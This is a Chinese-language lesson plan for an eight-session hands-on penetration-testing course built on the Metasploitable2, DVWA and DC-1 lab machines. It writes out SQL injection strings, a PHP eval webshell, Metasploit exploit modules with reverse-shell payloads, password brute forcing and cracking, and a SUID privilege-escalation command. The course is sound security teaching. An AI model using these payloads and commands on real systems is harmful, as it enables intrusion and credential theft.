**网络安全基础实战教学计划

**详细课时安排 **

第1课时：网络安全入门与环境验证

  • 教学目标：理解渗透测试基本流程，确保实验环境100%可用。
  • 教学内容与时序：
    1. （5分钟）开场：屏幕共享展示课程目标、CTF与考试大纲简介。老师口头提问学生“你认为黑客第一步做什么？”引发思考。
    2. （10分钟）理论速递：渗透测试5阶段（信息收集→漏洞发现→利用→提权→报告）。展示一张简单流程图。
    3. （30分钟）环境验证（一对一核心）：
      • 学生共享屏幕，老师指导：
        • 查看Kali IP（ip a），启动Metasploitable2和DC-1，查看各自IP。
        • 在Kali中ping两个靶机IP，确认连通。
        • 学生尝试用nmap -sV 靶机IP扫描Metasploitable2（老师实时纠正命令格式）。
      • 老师要求学生在Kali中创建一个文本文件，写入靶机IP地址，保存至桌面（验证基础文件操作）。
    4. （10分钟）Burp代理初步配置：老师演示如何设置Firefox代理到Burp，学生跟着做。老师检查Burp能否抓到HTTP请求。
    5. （5分钟）总结与答疑：学生复述今天学到的3个命令（ip a, ping, nmap）。布置课后小任务：自己再扫一遍DC-1端口，下次课开始时抽查。

第2课时：信息收集与资产探测（一对一演练）

  • 教学目标：熟练掌握Nmap扫描和Web目录扫描。
  • 教学内容与时序：
    1. （5分钟）复习：学生共享屏幕，演示扫描DC-1端口的命令及结果。老师点评。
    2. （15分钟）Nmap深入讲解：
      • 老师屏幕共享，对比-sV, -p-, -A参数的效果。
      • 然后让学生在自己的Kali上对Metasploitable2执行nmap -sV -p- [IP]，并共享屏幕，老师逐行解释输出端口（21,22,23,80,445,3306等）。
    3. （20分钟）Web目录扫描：
      • 老师演示dirb http：//靶机IP，解释发现的/admin,/phpmyadmin等目录含义。
      • 学生立即对DC-1的80端口执行dirb，老师观察学生是否遗漏常用参数（如-X .php）。
    4. （15分钟）实战记录习惯：要求学生用Kali自带的gedit或nano记录开放端口和服务版本，保存为recon.txt。老师强调报告习惯。
    5. （5分钟）小结：老师提问“假如你只扫到80端口开放，下一步做什么？”学生回答。

第3课时：Web安全基础与Burp Suite实战（一对一抓包）

  • 教学目标：掌握Burp抓包、重放、理解Cookie/Session，动手完成最基础的SQL注入。
  • 教学内容与时序：
    1. （5分钟）课前检查：学生演示Burp代理是否正常工作。
    2. （20分钟）Burp核心操作：
      • 老师演示访问Metasploitable2的/dvwa，抓取登录POST请求，发送到Repeater，修改参数后重放。
      • 学生自己抓取一个请求（任意页面），在Repeater中修改User-Agent，观察响应变化。
    3. （20分钟）SQL注入入门（一对一重点）：
      • 老师共享屏幕，在DVWA（Low安全级别）中输入1' or ‘1’='1绕过登录。
      • 然后让学生自己尝试，并解释为什么输入admin' -- 也能登录。
      • 老师实时观察学生是否理解单引号闭合原理，可随时画图解释。
    4. （10分钟）课后挑战布置：要求学生用Burp Repeater手工探测字段数（order by），下节课口头说明结果。
    5. （5分钟）答疑：解决学生关于URL编码、Cookie作用的问题。

第4课时：暴力破解与Webshell管理（蚁剑实操）

  • 教学目标：学会使用Burp Intruder爆破弱口令，上传一句话木马并用蚁剑连接。
  • 教学内容与时序：
    1. （10分钟）理论：暴力破解原理、字典作用。老师展示Kali自带的rockyou字典位置。
    2. （20分钟）Burp Intruder爆破DVWA登录：
      • 老师演示设置Payload位置、加载字典、分析响应长度差异。
      • 学生自己操作，老师观察学生是否选对“Sniper”模式、能否从响应中找出成功登录的包。
    3. （15分钟）一句话木马与文件上传：
      • 老师演示编写shell.php内容：<?php @eval($_POST[‘cmd’]);？>。
      • 在DVWA文件上传模块上传，绕过前端JS（指导修改MaxLength或禁用JS）。
      • 学生立即尝试上传（老师远程协助处理常见错误如上传路径未知）。
    4. （10分钟）蚁剑连接：
      • 老师演示添加数据，URL填写http：//靶机IP/dvwa/hackable/uploads/shell.php，密码cmd。
      • 学生自己连接，浏览文件、执行whoami。
    5. （5分钟）总结：强调Webshell权限是www-data，为后续提权做铺垫。

第5课时：Metasploit Framework入门（一对一利用）

  • 教学目标：使用MSF自动化攻击Metasploitable2，理解漏洞利用过程。
  • 教学内容与时序：
    1. （10分钟）MSF基本概念：老师共享屏幕，展示msfconsole界面，介绍search, use, set, run。
    2. （30分钟）经典漏洞利用（学生主导）：
      • 老师先演示一遍Samba漏洞（CVE-2007-2447）：
        • search samba → use exploit/multi/samba/usermap_script
        • set RHOST 靶机IP → set payload cmd/unix/reverse_netcat → run
      • 然后学生自己操作，要求学生在获得shell后执行whoami，并截图。
      • 老师观察学生是否忘记设置payload或LHOST，及时纠正。
    3. （10分钟）探索其他漏洞：老师提示vsftpd 2.3.4漏洞（端口21），让学生自己搜索并尝试利用（若时间充裕，作为课堂挑战）。
    4. （10分钟）反向连接原理解释：老师用白板工具画图，解释为什么需要LHOST（攻击机IP）。

第6课时：DC-1靶机实战（上）——Drupal漏洞利用

  • 教学目标：综合运用Nmap、MSF攻击DC-1，获取第一个flag。
  • 教学内容与时序：
    1. （5分钟）任务发布：老师给出目标——拿下DC-1的flag1。
    2. （10分钟）学生独立信息收集：学生共享屏幕，对DC-1执行Nmap扫描，老师观察并纠正。
    3. （25分钟）MSF利用Drupal漏洞：
      • 老师演示search drupal，选择exploit/unix/webapp/drupal_drupalgeddon2。
      • 设置RHOSTS，exploit获得Meterpreter shell。
      • 然后学生自己做（老师提前提醒可能需要设置TARGETURI为/）。
    4. （15分钟）寻找flag1：
      • 学生在Meterpreter shell中执行shell，cat flag1.txt。
      • 阅读提示，老师引导学生思考“配置文件通常在哪”，学生自己尝试find / -name *settings.php 2>/dev/null。
    5. （5分钟）小结：记录flag1内容，并强调CMS漏洞的危害。

第7课时：DC-1靶机实战（下）——数据库与提权（一对一突破）

  • 教学目标：读取数据库配置、破解密码、SUID提权，完成完整攻击链。
  • 教学内容与时序：
    1. （10分钟）读取数据库配置：
      • 老师提示路径/var/www/html/sites/default/settings.php，学生用cat读取，找到数据库用户名密码。
      • 学生自己执行，老师检查是否遗漏。
    2. （20分钟）数据库操作与密码破解：
      • 学生连接MySQL：mysql -u dbuser -p，输入密码。
      • 查询users表，获得admin的密码哈希。
      • 老师演示将哈希保存到文件，使用john破解（可预先告诉学生弱密码为“123456”或“password”，以节省时间）。
      • 学生自己执行破解命令。
    3. （20分钟）SUID提权：
      • 老师提问“如何查找有SUID权限的文件”，学生尝试find / -perm -4000 2>/dev/null。
      • 发现/usr/bin/find，老师讲解SUID原理，然后学生执行find / -exec “/bin/sh” \;获得root shell。
      • 读取/root/flag3.txt。
    4. （10分钟）整体攻击链复盘：老师引导学生口述从信息收集到root的每一步，学生共享屏幕整理笔记。

第8课时：综合演练与考试对接（模拟实战）

  • 教学目标：独立完成Metasploitable2-Linux上三个flag的获取，对接考试题型。
  • 教学内容与时序：
    1. （5分钟）发布任务：老师给出三个目标（同原计划）：
      • Flag1：MySQL服务版本。
      • Flag2：利用UnrealIRCd漏洞（端口6667）获得shell，找到当前用户名。
      • Flag3：Web目录下敏感配置文件中的密码。
    2. （40分钟）学生独立操作（老师静默观察）：
      • 学生共享屏幕，全程自己操作，老师只在遇到卡死或严重错误时提示。
      • 记录学生每个步骤的时间，课后反馈给其改进点。
    3. （10分钟）关键步骤讲解：
      • 老师演示UnrealIRCd漏洞利用（MSF中exploit/unix/irc/unreal_ircd_3281_backdoor），并解释为何无需认证。
      • 展示Flag3常见位置（如/var/www/config.php）。
    4. （5分钟）考试技巧与后续路径：
      • 强调Flag提交格式flag{...}，每做完一题立即记录。
      • 推荐在线练习平台：BugKu、CTFshow、Hack The Box。
      • 告知学生下节课可开始学习《2026大纲》中的逆向或密码学基础（根据兴趣定制）。
